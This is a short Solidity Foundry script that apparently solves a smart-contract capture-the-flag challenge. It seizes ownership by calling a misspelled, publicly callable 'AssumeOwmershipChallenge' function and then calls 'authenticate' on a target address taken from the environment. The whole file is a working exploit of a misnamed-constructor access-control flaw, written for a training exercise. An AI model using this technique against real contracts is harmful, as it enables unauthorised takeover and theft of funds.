// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IAssumeOwnership {
    function AssumeOwmershipChallenge() external;

    function authenticate() external;
}

contract AssumeOwnershipSolution is Script {
    IAssumeOwnership private assumeOwnership = IAssumeOwnership(vm.envAddress("ADDRESS"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        assumeOwnership.AssumeOwmershipChallenge();
        assumeOwnership.authenticate();
        vm.stopBroadcast();
    }
}
